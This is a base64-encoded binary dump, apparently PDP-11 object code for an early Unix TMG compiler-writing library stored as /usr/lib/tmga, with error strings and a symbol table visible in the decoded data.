oKBgFiCOwTnAh/AFxuXDAAAE8aZAgxIHN1Y2MAAE8abggDAAAAoQIBANwU0BQxIHN1Y2MA
AKACAQDcFNwUCBZPGoYIGhQGAQwJ1hAGAQwJ7hg8AAIBtghIDA4BDAnuGCoAAgHGCD4aaw
gOAQwJ7hgoAO4YKQACAdoIPhp3CA4BDAmKGHoI9BT2FPgU0hr0FNIafAiwGr4amAbuGCkA
QBT0FDoJAgEICT4afwgOAQwJPhqPCH8AAQDSGu4U0hoOCbAavxoAANIa7hTSGhwJsBq/Gg
IA0hruFNIaKgmwGr8aAgDSGu4U0ho4CUgZxxoBANIa7hTSGkYJPBnHGnRyYW5zOzEgAAAa
GgEA6hkBAE4aVAmhAgEALnB4ABoaAQDqGQEAThpuCaECAQAucG4AGhoBAOoZAQBPGoIJLn
QAAE8akgkucAAATxqaCRoaAQCgAgIACBbqGQEAoQIBAO4YPQACAc4JKgoGAcYJ7BNcCj4a
XwkOARIK7hg8AAIB4AnmCz4acwkOARIK7hgqAAIB8Ak+GocJDgESCu4YWwCQDO4YPwACAQ
YKPhqXCQ4BCgo+Gp8J7hhdAD4aowl/AFstAABcPDFdAABOGhQKoAIBAE8aGAoqFAIBPgqc
FPoU/BQCAYATDgFECu4YJAAaFD8aHwpncGFyOwBOGkgKoAICAAgWoQIBAEAU/hSeCgYBfA
ruGCgAGhQGAXIKfgruGCkAngo+Gk8KfwDQE4YKVxgAFS4UYxT+FAAVMSBnZW5lcmF0ZQAA
TxqOCu4YewDuGH0AAgGyCj4amwoOAbQKxgp/ANAUoQIBAKACAgAIFqECAQACC+4YfQACAd
gKPhq3Cg4B3grGCj4avQp/AC50eABOGuAKoQIBAC50bgBPGuwKLnRxOwAAThr0CqECAQDu
GDwAAgEUC+YLPhrlCg4BVAvuGCoAAgEkCz4a8QoOAVQL7hgkAAIBNgsaFD4a+woOAVQLGh
QCAUYLigs+Gs8LDgFUCyoUVgsGAYATcAsGAYATfwCcFPQU9hSKCz8azwsudHE7AABOGmIL
oQIBAJwU/hQAFT8aaQtJGjAAoAICAEgaOwChAgEA7hguAAIBmAsaFA4BnAs+GnsL7hgoAA
IBsAvQE7YL7hgpAA4BsgvIFD8afwsqFAYBwAvsE54KfwAudHA7LmJ5dGUgAABOGsILoAIC
AEgaLAChAgEASBo7AKECAQAEDAYB9AvsE0gMPhrfC38APgBzOycAThr4C6ECAQCkF+gUNh
sMFuYU9Bj2C2gWPxr9Cz4AXAA+AE4aGgxPGhwMPgBcMAAAPjsuZXZlbgBIGjwAoAICAKAC
AQBOGigMTxosDKQX6BT0GBgMAgFcDD4aHwwOAV4MyBR6DPQYJgw/GjUMXABcXAAAoAICAE
4aagyhAgEANhuoGeYUaBb0GGgMAgGAE3oMPxpvDKoMBgGYDM4MfwCgAgMACBagAgEACBah
AgIA8A1IDpAMPxqbDKACAwAIFqACAQAIFqECAgCgAgIACBahAgEAcg04FggPAgHmDHINPh
q1DAYB0AwOAfQMNA0CAfQMPhrFDA4B9Ax/AC50O2FsdDsAc2FsdDsAThr2DKACAgAIFqAC
BAAIFk4a/gygAgEACBagAgIASBo6AKACAwAIFqACAQBJGjoA7hg/AM4M7hg6AM4MphOmEz
8aBQ2gAgIACBahAgEAoAIBAAgWoQICAKACAQAIFqECAgAubDsAThpmDaECAQDwDQIBhg10
EAIBgBM+GkkNDgHADSwQAgGWDfANPhpTDQ4BwA3uGCgAAgGoDZAM7hgpAA4BwA2sEAIBuA
1yDT4aXQ0OAcAN7BMaFD4aaw1/AC5sOwBOGsINoQIBAC5ydgCgAgEACBZPGs4NLmYAAKAC
AgAIFqACAQAIFk8a3A0qCgIB/g0+GscNDgEaDu4YKAACARAO8A3uGCkADgEaDu4YKgByDT
4a0w3uGFsAAgGAEzgWkAzuGF0APhrhDQcBGg4udQAAoAIBAAgWTxoyDi5zdABPGkAO7hg9
AKQX6BQIDwIBXg4+GjcODgFiDj4aRQ5/AO8YKwDuGCsAuRNkDi5hAABPGnAOLnMAAE8aeA
4ubQAATxqADi5xAABPGogOLnIAAE8akA4ubwAATxqYDi54AABPGqAOLm4AAE8aqA49PQAA
LmVxAE8atA4hPQAALm5lAE8awA48PQAALmxlAE8azA4+PQAALmdlAE8a2A48PAAALnNsAE
8a5A4ubHQATxrsDj4APgAuc3IATxr4Di5ndABPGgAPNhukF+gU7hgrAAIBIg+4E2gOPhp1
Dg4BChDuGC0AAgEyDz4afQ4OAQoQ7hgqAAIBQg8+GoUODgEKEO4YLwACAVIPPhqNDg4BCh
DuGCUAAgFiDz4alQ4OAQoQ7hh8AAIBcg8+Gp0ODgEKEO4YXgACAYIPPhqlDg4BChDuGCYA
AgGSDz4arQ4OAQoQ9BiwDgIBog8+GrkODgEKEPQYvA4CAbIPPhrFDg4BChD0GMgOAgHCDz
4a0Q4OAQoQ9BjUDgIB0g8+Gt0ODgEKEPQY4A4CAeIPPhrpDg4BChDuGDwAAgHyDz4a8Q4O
AQoQ9Bj0DvQY9g4CAQYQPhr9Dg4BChA+GgUPfwAubHYATxoMECsrAAAuaWIATxoYEC0tAA
AuZGIATxokEDYbpBfoFO4YJgACAUIQPhoREA4BWhD0GBQQAgFSED4aHRAOAVoQ9BggED4a
KRB/ACsrAAAuaWEATxpgEC0tAAAuZGEATxpsEDYbpBfoFPQYXBACAYoQPhplEA4BkhD0GG
gQPhpxEH8ALm50AE8alBAubmcATxqcEC5jbQBPGqQQ7hghAAIBvBA+GpkQDgHUEO4YLQAC
AcwQPhqhEA4B1BDuGH4APhqpEH8A7hghAAIB5hD2EHoRDgHoEPYQVxh8Ejw8AAABADw8AA
D0GOwQ0hp8EtIa8BDSGn4SvBeYGbAavhrSGnwSxhoCAeIRJBH0GPIQBwEYET4ApBfoFPQY
IhEGAT4RWBEHASgRPgA+APUYOBH0GDYRBgFKEZoR3gC4EzoRBgFUEVgRfwACAEwW8hTSGl
YR0hryFCAY0hqAEgwY1BcUGNIafBLoF7gavxroEdIagBIMGNIa8hTUFxQY0hp8Ev4XuBq+
GvgRBwF8EdIafhLIF74a6BHSGoASDBjSGvIU1BcUGNIafBJqGvIXuBq+GvgRBwGkEXRvby
BtYW55IGNoYXIgY2xhc3NlcwBPGsQRPxrbEUUB3hEAANIa8hTSGuYRsBq/GgIAAAHSGvIU
0hr0EdQXuBrSGvYRVBnHGgAALmdsb2JsIGNsYXNzdGFiAGNsYXNzdGFiOgAIFk4aDhIIFk
4aHhIJFj8aKRKgAgEACRZWGPAUPxo7EugR0hqAEtIaDBKwGr4aSgE2EtIa8BTSGoASDBjS
GvIU1BcUGLAavhpKAUASOBb4EQcBWhIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAH8ASBouAKECAQDSGuoUvBe+GlYY6hQ/GoMTLi4AAE4a
mhOhAgEA0hrsFLwXvhpWGOwUPxqfEwEAdhi2E/7/AgGAE98AAQCgAgIACBahAgEAdhjEE/
7/OBbuGCwAAgGAE/7/PhrHEwcB1hMBAHYY6hOKE0sBDhT+/wEAPS4AAKACAgBOGvoTCBag
AgEACRZ2GPgTkhP+/z8a/xM2G6QX6BQMFuAUqBngFGkWLhRpFjYbpBfoFAwW4hSpGeQUAQ
AAAHYYPBTSGv7/xhoCAYATyBb+/9Ia/v/SGj4UsBq/GgIAAAB2GF4U0hr8/8YaBgGAFMQZ
/P/SGv7/0hpgFLAavhraFvz/AhXSGvz/0hoCFXAa0hr+/7wXsBq/GgIAdhiaFNIa/P/GGt
YW/P8CFdIaAhXSGv7/0hr8/9IaAhVwGt4XsBq+GlcYAhU/Gt0UMSAAAE8azBTrGQEA6xkC
ABMCCAAQACAAQACAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIcAhwCHAIcAhw
CHAIcAhwCPAI8AhwCHAIcAhwCHAIcAhwCHAIcAhwCHAIcAhwCHAIcAhwCHAIcAhwCHAIcA
jwCHAIcAhwCHAIcAhwCHAIcAhwCDAIcAhwCHAIcAhwDXANcA1wDXANcA1wDXANcA1wDXAI
cAhQCHAIcABwCHAIcA5wDnAOcA5wDnAOcA5wDnAOcA5wDnAOcA5wDnAOcA5wDnAOcA5wDn
AOcA5wDnAOcA5wDnAIcABwCHAIcAhwCHAOcA5wDnAOcA5wDnAOcA5wDnAOcA5wDnAOcA5w
DnAOcA5wDnAOcA5wDnAOcA5wDnAOcA5wCHAIcAhwCHAIcA7xgKAEkaCgBmHQYA9wk87fcJ
/AQEh7UVBgB3ALzq1gt3AFbq9wkk7QESABHBDEDgBAEDAUARwGUOAPcJqOvACwEDFBB3AD
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
YA9QHAHfgPBIlANAAE9wlg+oIVgBWHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAD//wEAAQACAAEAAAA=
-- /usr/lib/tmga mode=0100664 uid=3 gid=3 atime=174924573 mtime=174924479 base64=1 --
BwFyAwgAAAAwAwAAAAAAAM4KFAO3HQQAAgAFiQAAAAAehzcQ6v/OCgkDtx0GAAIACIkAAL
YBE4c3ENT/xRUAADUKAAA1CgAANQoAAEQRxGUAAMAVcgP3CVoB9wnsAgqJVAABiWFsbG9j
LmQA9x2g/57/9wmaAsAVdAD3CZIC9wnIAgQALS1mYXRhbAoAALcK8AL1NQEAAABDArcK5g
L3C27/BAPAFXIA9wlk//cJsAI1EAAAwEUBABcgcgMUhxcgAAAShxcgAAAOhzcInv9iYWQg
YWRkcmVzcyBpbiBwYXJzaW5nAABIAPcJyADQhrcKlAL1NQEAAAAnAvcJYgI1EAAAwEUBAB
cgAgEFAxcgBgEbAtMLvAH3CUYCAxC+AfsBQBHAZQAA9wnQAEQRRRNDHQAANR0AAAAANR0A
AAAAwAsBAxQQoQCHAEQRRRNDHQAAsQCHAMEduP4CAcEdsv7mHa7+dxCq/mYdAAAmEfcJ8A
H3CUAAGYcWIREHABn3CZD+Qx0AAAMLw2UAAGYRBRE1CgAA9wmMAIUVQx0AALUVAAC3FWz+
dwDm/oQVtRUAALcVXv6dAbcK0AFMEfUQAAB0HQAAAAB0HQAAAAB0HQAAAAAFEcRlAAAXIQ
AABYYDEHUQAAB3ALT+NwiC/nN0YWNrIG92ZXJmbG93AAAEIAKHAAqHACYQARBAFEQgCQNm
EPcJ/v2BFUAURCD5g0AdAACEFYcA9TUBAAAABQPF5QAAQx0AAIcA9wvY/QQDwBVnAPcJzv
3AFDUQAADARQEAFyByAxqHFyAAABiHFyAAABSHAAsXIAAAH4c3CAL+YmFkIGFkZHJlc3Mg
aW4gdHJhbnNsYXRpb24AAEgA9RAAAAMQdR0AAAAAdR0AAAAAxWUAAPcJkv+/AXURAADAZQ
AAAxDCAcCUwpSACsAM9RAAAHURAABBHQAAQxwAAAPgxWUAAHURAADCDBIDwxIDCwkENwiM
/W5vdCBhIGJ1bmRsZQAA1yAAALmGw2UAAIPg9wk2/5EBJgomEIAR9wkGAMZlBACHAPct/P
z6/AcDJhD3CSwAgBX3Hez86vzBHeb8yIsNAzGUAACBCncQ2PxXIAAA9gUmEPcJBgCAFeQB
hwD3HcL8CADAHbz8BIkAAAAANwqy/IcAQRHAFA0EJhDORf7/gENBHAAAQGwAAAAS+gVBHA
AAgFWHAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAAAAAZAQAAAAAAAAAAAwAAAAAAAAAA
AAAACQEAAAgCAAB4AgAAiAIAAJgCAAAAAKgCAAACAAAAAwAAAAMAAAACAAAAAAAAAAAAAA
AAAPkA6QAAAAMAAAACAAAAAwAAAAMAAAAAAAAAAAAAAAAAAAAFAAAAAABYAgAAAAAFAAAA
OQIAAAAAAAAAAEkCAAADAAAAWAIAAAAAAAACAAAAAAD4AQAAAADYAQAAAAADAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAFAAAAAABYAgAAAAADAAAAWAIAAAAAAAAC
AAAAAAACAAAAAAAAAAAAAwAAAAAAAAAAAAAAqAIAAAMAAAAAAAAAaAIAAHgCeAIAAIgCiA
IAAAAAAAAAAAAAAAAAAAAAaAIAAAAAAAD5AAAAAAAJAQAA6QAAAOkAAACIAgAAAAADAAAA
AwAAAAAAAAAAAAAAyQAAAIgCAAAAACgCAAAAAAAAWAIAAAMAAAAAAGgCAACIAgAA6QAAAA
MAAAAAAIgCAADpAAAAAAAFAAAAAABoAgAAeAJ4AgAAiAKIAgAAmAKYAgAAAACoAgAAGAIA
AAAAAAC4AgAAAwAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
DJAAAAAAAAAAAAAACIAgAAAAAAAAAAWAIAAAAAiAMAAGgCAAAAADkCAAAAAAAAAABJAgAA
AABYAgAAAAAAAAIAAAAAAPgBAAAAANgBAAAAAAAAmAMAAAAAAwAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAGgCAAAAAEgDaAMAAFgDeAMAAIgDAAADAAAAAABIAwAAKAIA
AAAAAAAAAAAAAAAAAGgCAAB4AwAASAMAAGgCAAAAAIgDAABIAwAAAAAAAAAAAAAAAAMAAA
AAAAAAAAAAAAAAAAAAAJgDAAAAACgCAAAAAAMAAAAAAAAAAAAAAAMAAAAAAAAAAADpAAkE
AAAAAAAAAwAAAAAA6QAJBAAAOQQAAAAAAAAYBAAAAAA5BAAAKAQAAAAAAAADAAAAAAAAAA
AAOQQDAAAACQQAABgEAAAAADkEAAAAAAAAAAAAAAAAAAAAAAAAuAIAAGgCAAAAAAAAuAIA
AAAAAAAAAAAAAAB0cmFjaW5nAAEAAQBmAAAAAAAAABQABQBnAAAAAAAAABQABABpAAAAAA
AAABQAAwBzZWYAAAAAAAEAsQBjbGYAAAAAAAEAoQBiZnMAAAAAAAYAAIdiZmMAAAAAAAYA
AIZmbHVzaAAAACIAOgNvYnVpbGQAACIAAANwdXRjaAAAACIA8AJpZ2V0AAAAACIAUANrcH
V0AAAAACAAAABnZW5lcmF0ZSIAEgJjZmlsZQAAACAAAABkZmlsZQAAACAAAABvZmlsZQAA
ACAAAABpbnB1dAAAACAAAABtYWluAAAAACIAAABzdWNjAAAAACIAfgBmYWlsAAAAACIA3g
BlcnJjb20AACIAXABwYnVuZGxlACIA6gFwYXJzZQAAACIASgFkaWFnAAAAACIARAFhbHQA
AAAAACIAAgFzYWx0AAAAACIABgFzdG9wAAAAACIAcgBnb3RvAAAAACIADgF0YWJsZXMAAC
AAAABzdGFydAAAACIAcgNlbmQAAAAAACAAAABzdGtiAAAAACAAAABzdGtlAAAAACAAAABr
dGFiAAAAACAAAAB0cnN3aXRjaCAAAAB0cmFjZQAAACAAAAB4AAAAAAAAACAAAABzaQAAAA
AAACAAAABqAAAAAAAAACAAAABrAAAAAAAAACAAAABuAAAAAAAAACAAAABnMQAAAAAAACAA
AABlbnYAAAAAACAAAABhZHYAAAAAAAIApAFzdWNjYwAAAAMAcgNzcmV0AAAAAAIAEAFjb2
50aW4AAAIAigBjb250aW5jAAMAdANmYWlsYwAAAAMAdgNmcmV0AAAAAAIAOAFhZHZjAAAA
